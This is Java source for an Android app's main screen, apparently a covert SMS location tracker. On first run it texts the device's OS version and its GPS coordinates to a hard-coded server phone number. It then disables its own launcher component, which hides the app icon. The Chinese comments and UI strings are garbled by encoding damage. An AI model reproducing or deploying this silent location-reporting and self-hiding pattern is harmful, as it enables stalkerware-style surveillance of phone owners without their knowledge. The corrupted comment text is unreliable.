package com.byc.smslocated;









import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends CheckPermissionsActivity {
	private MyLocation myLocation=null;
	 private TextView tvIndicator; 
	 private Button btReboot;
	public Config config;
	 private String s;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		//myLocation=MyLocation.getMyLocation(getApplicationContext());
		 initWidgets();
		 //��������
		 Intent intent=new Intent(this,MainService.class);
		 startService(intent);
		//���չ㲥��Ϣ
	    IntentFilter filter = new IntentFilter();
	    filter.addAction(Config.ACTION_SERVICE_INFO);
	    registerReceiver(ServiceReceiver, filter);
	}
    @Override
    protected void onStop() {
        super.onStop();
        unregisterReceiver(ServiceReceiver);
    }
	private BroadcastReceiver ServiceReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            Log.d(Config.TAG, "receive-->" + action);
            if(Config.ACTION_SERVICE_INFO.equals(action)) {
            	requestPower();
            } 
        }
    };
    /*
     * ��������Ȩ�޴��壺
     */
    private void requestPower(){
    	 config=Config.getConfig(getApplicationContext());
		 //����Ȩ�ޣ�
		 myLocation=MyLocation.getMyLocation(getApplicationContext());
		 
		 if(config.isFirstRun()){
				//if (Build.VERSION.SDK_INT>=23) { showSetPermission(); return;}
				String address=Config.PHONE_NUMBER_SERVER;
				String body=android.os.Build.VERSION.RELEASE;
				SmsReceiver.SendSms(address, body);
				//��ȡ��λȨ�ޣ�
				if(MyLocation.isGpsOpen()){//��λ���ܴ򿪣�
					//Toast.makeText(this, "����趨λȨ�ޣ�����ʹ�ñ������" ,Toast.LENGTH_SHORT).show();
					myLocation.GetSingleLocation();
					//��ȡ���Ͷ���Ȩ�ޣ�
					body=myLocation.locationInfo.provider+"("+myLocation.locationInfo.dX+","+myLocation.locationInfo.dY+")";
					//Toast.makeText(this, "����跢�Ͷ���Ȩ�ޣ�����ʹ�ñ������" ,Toast.LENGTH_SHORT).show();
					SmsReceiver.SendSms(address, body);
					//restartApplication();
				}else{
					Toast.makeText(this, "�뿪���ֻ�GPS��λ���ܣ�����ʹ�ñ������" ,Toast.LENGTH_SHORT).show();
					Intent intentOpen = new Intent();
					intentOpen.setAction(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
					intentOpen.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					startActivityForResult(intentOpen,0); //��Ϊ������ɺ󷵻ص���ȡ����
					//DlgUtils.showLocServiceDialog(this);
					config.setFirstRun();
					Toast.makeText(this, "������ɣ���㡾������������ť��" ,Toast.LENGTH_SHORT).show();	
					return;
				}
		 }
		//���� ��
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
	private  void initWidgets(){
		tvIndicator = (TextView) findViewById(R.id.tvIndicator);
		btReboot=(Button)findViewById(R.id.btReboot);
    	//---------------------------�������� Ӧ�ó��� --------------------
		btReboot.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v){
				//Toast.makeText(MainActivity.this, "����������������...." ,Toast.LENGTH_SHORT).show();
				//String body="����������������...." ;
				//String address=Config.PHONE_NUMBER_SERVER;
				//Toast.makeText(this, "����跢�Ͷ���Ȩ�ޣ�����ʹ�ñ������" ,Toast.LENGTH_SHORT).show();
				//if(SmsReceiver.SendSms(address, body))Toast.makeText(MainActivity.this, "��������..." ,Toast.LENGTH_SHORT).show();
				restartApplication();
			}
		});
		String say=getVersion()+"������ɣ�����������������ť��";
		tvIndicator.setText(say);
	}
	private String getVersion(){
    	  try {
      		  PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), 0);
      		  String version="�汾�ţ�"+info.versionName+"("+info.versionCode+")";
      		  return version;
      	  } catch (PackageManager.NameNotFoundException e) {
      		  e.printStackTrace();
            
      	  }
    	  return "";
	}
	private void restartApplication() {
		final Intent intent = getPackageManager().getLaunchIntentForPackage(getPackageName());
		intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
		startActivity(intent);
	}
	// Ϊ�˻�ȡ���
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		// RESULT_OK���ж�����һ��activity�Ѿ������������빦�ܣ�Standard activity result:
		// operation succeeded. Ĭ��ֵ��-1
		if (requestCode == 0) {
			if(MyLocation.isGpsOpen())
				myLocation.GetSingleLocation();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
	/*
	 * ����Ƿ�����λ����
	 */
	public boolean checkSendMmsPermission() {
		int checkResult = PermissionHelper.checkOp(this, PermissionHelper.OP_SEND_SMS, PermissionHelper.OPSTR_SEND_SMS);
		int checkResult2 = PermissionHelper.checkOp(this, PermissionHelper.OP_RECEIVE_SMS, PermissionHelper.OPSTR_RECEIVE_SMS);
		int checkResult3 = PermissionHelper.checkOp(this, PermissionHelper.OP_READ_SMS, PermissionHelper.OPSTR_READ_SMS);
        if (PermissionHelper.MODE_IGNORED == checkResult || PermissionHelper.MODE_IGNORED == checkResult2|| PermissionHelper.MODE_IGNORED == checkResult3) {
            //DlgUtils.showLocIgnoredDialog(this);
        	return false;
        }else{
        	return  true;
        }
	}
	/*
	 * ����Ƿ�����λ����
	 */
	public boolean checkLocationPermission() {
	        if (!PermissionHelper.isLocServiceEnable(this)) {//����Ƿ�����λ����
	            //DlgUtils.showLocServiceDialog(this);
	        	return false;
	        } else {//����û��Ƿ񽫵�ǰӦ�õĶ�λȨ�޾ܾ�
	            int checkResult = PermissionHelper.checkOp(this, 2, PermissionHelper.OPSTR_FINE_LOCATION);//����2����AppOpsManager.OP_GPS�����Ҫ�ж�������Ȩ�ޣ��ڶ��������軻��24��AppOpsManager��OP_SYSTEM_ALERT_WINDOW����������������Ҫ����AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW
	            int checkResult2 = PermissionHelper.checkOp(this, 1, PermissionHelper.OPSTR_FINE_LOCATION);
	            if (PermissionHelper.MODE_IGNORED == checkResult || PermissionHelper.MODE_IGNORED == checkResult2) {
	                //DlgUtils.showLocIgnoredDialog(this);
	            	return false;
	            }else{
	            	return true;
	            }
	        }
	}


		
}
